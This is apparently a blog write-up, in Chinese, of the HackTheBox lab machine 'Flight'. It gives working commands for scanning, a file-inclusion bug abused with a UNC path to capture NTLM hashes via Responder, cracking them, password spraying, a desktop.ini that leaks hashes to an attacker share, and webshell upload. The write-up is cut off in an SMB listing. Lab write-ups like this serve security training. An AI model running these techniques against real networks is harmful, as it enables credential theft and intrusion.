---
title: Flight - HackTheBox
url: https://darkwing.moe/2022/11/07/Flight-HackTheBox/
source: 喵喵喵喵
date: 2022-11-08
fetch_date: 2025-10-03T21:54:57.723876
---

# Flight - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Flight - HackTheBox

# Flight - HackTheBox

##### 2022-11-07

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.187](#10-10-11-187)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
   2. [2.2. 子域名扫描](#子域名扫描)
3. [3. school](#school)
   1. [3.1. LFI](#LFI)
   2. [3.2. responder](#responder)
4. [4. SMB](#SMB)
   1. [4.1. users](#users)
   2. [4.2. users.txt](#users-txt)
   3. [4.3. Shared](#Shared)
   4. [4.4. desktop.ini](#desktop-ini)
5. [5. Web](#Web)
6. [6. c.bum shell & user flag](#c-bum-shell-amp-user-flag)
7. [7. 提权信息](#提权信息)
8. [8. 提权 & root flag](#提权-amp-root-flag)
   1. [8.1. hashdump](#hashdump)
9. [9. 参考资料](#参考资料)

# Flight - HackTheBox

2022-11-07

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/510>
* ## 10.10.11.187

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110701.jpg)

# 端口扫描

80，以及windows域常规端口：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.187 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 13:39 CST Nmap scan report for 10.10.11.187 Host is up (0.21s latency). Not shown: 988 filtered tcp ports (no-response) PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation | http-methods: |_  Potentially risky methods: TRACE 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-07 12:42:13Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  tcpwrapped 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open  tcpwrapped Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time: |   date: 2022-11-07T12:42:28 |_  start_date: N/A | smb2-security-mode: |   311: |_    Message signing enabled and required |_clock-skew: 7h00m00s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 219.19 seconds ``` |

## 80

某航空公司网站：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110702.jpg)

## 子域名扫描

80页面底部可以得到主域名，继续探测子域名，发现school：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` 10.10.11.187 flight.htb  ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://flight.htb/" -H 'Host: FUZZ.flight.htb' -fs 7069  school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 214ms] ``` |

# school

school加hosts后访问，发现view参数，猜测LFI：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110703.jpg)

## LFI

直接读index，发现代码中有各种过滤：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` view-source:http://school.flight.htb/index.php?view=index.php ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110704.jpg)

## responder

但注意这是windows靶机，这些过滤并没有过滤掉UNC路径，所以开启Responder，得到svc\_apache hash,破解出来密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` sudo python3 Responder.py -i 10.10.14.5 -wP  http://school.flight.htb/index.php?view=//10.10.14.5/miao  [SMB] NTLMv2-SSP Client   : 10.10.11.187 [SMB] NTLMv2-SSP Username : flight\svc_apache [SMB] NTLMv2-SSP Hash     : svc_apache::flight:d97722b76908e7cd:9450E5DC7E24C1C4621BD43B63122479:01010000000000000055FFBEB0F2D80122570DD2EDA78DBA0000000002000800340050005800440001001E00570049004E002D0044003300560039004D0057005400470042004F004E0004003400570049004E002D0044003300560039004D0057005400470042004F004E002E0034005000580044002E004C004F00430041004C000300140034005000580044002E004C004F00430041004C000500140034005000580044002E004C004F00430041004C00070008000055FFBEB0F2D80106000400020000000800300030000000000000000000000000300000DD878F1675772A6A6DAFDDDCC8BF586057C3E89BC8B800F8FA52C363333E663C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  S@Ss!K@*t13      (svc_apache) ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110705.jpg)

# SMB

使用得到的账号密码枚举smb：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110706.jpg)

## users

使用得到的密码枚举用户, 之后进行密码喷洒，发现s.moon使用相同密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users  ./cme smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success  SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 ``` |

## users.txt

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` svc_apache O.Possum V.Stevens D.Truff I.Francis W.Walker C.Bum M.Gold L.Kein G.Lors R.Cold S.Moon krbtgt Guest Administrator ``` |

## Shared

尝试使用S.Moon pexec失败，但可以发现对shared目录有写权限：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110707.jpg)

这个目录可能会有其他用户定期访问，所以尝试其他方式获取hash：

* Places to steal NTLM creds - HackTricks
  <https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` └─$ smbclient //10.10.11.187/shared -U s.moon Password for [WORKGROUP\s.moon]: Try "help" to get a list of possible commands. smb: \> put desktop.ini putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s) smb: \>  [SMB] NTLMv2-SSP Client   : 10.10.11.187 [SMB] NTLMv2-SSP Username : flight.htb\c.bum [SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:a80233880ad07bcc:A3E7491E25095F99AE86B4C2B654324E:01010000000000000055FFBEB0F2D801006A095B7D83AB570000000002000800340050005800440001001E00570049004E002D0044003300560039004D0057005400470042004F004E0004003400570049004E002D0044003300560039004D0057005400470042004F004E002E0034005000580044002E004C004F00430041004C000300140034005000580044002E004C004F00430041004C000500140034005000580044002E004C004F00430041004C00070008000055FFBEB0F2D80106000400020000000800300030000000000000000000000000300000DD878F1675772A6A6DAFDDDCC8BF586057C3E89BC8B800F8FA52C363333E663C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000 ``` |

等一会儿，得到c.bum用户hash：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110708.jpg)

同样破解出来密码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  Tikkycoll_431012284 (c.bum) ``` |

## desktop.ini

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` [.ShellClassInfo] IconResource=\\10.10.14.5\miao ``` |

# Web

c.bum用户可以写web目录，写webshell去访问触发，得到svc\_apache shell:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` └─$ smbclient //10.10.11.187/web -U c.bum Password for [WORKGROUP\c.bum]: Try "help" to get a list of possible commands. smb: \> ls   .                                   D        0  Mon Nov  7 21:38:38 2022   ..                                  D        0  Mon Nov  7 21:38:38 2022   flight.htb                          D        0  Mon Nov  7 21:37:00 2022   school.flight.htb                   D        0  Mon Nov  7 21:37:00 2022   shell.php                           A       42  Mon Nov  7 21:38:38 2022  		5056511 blocks of size 4096. 1028784 blocks avail...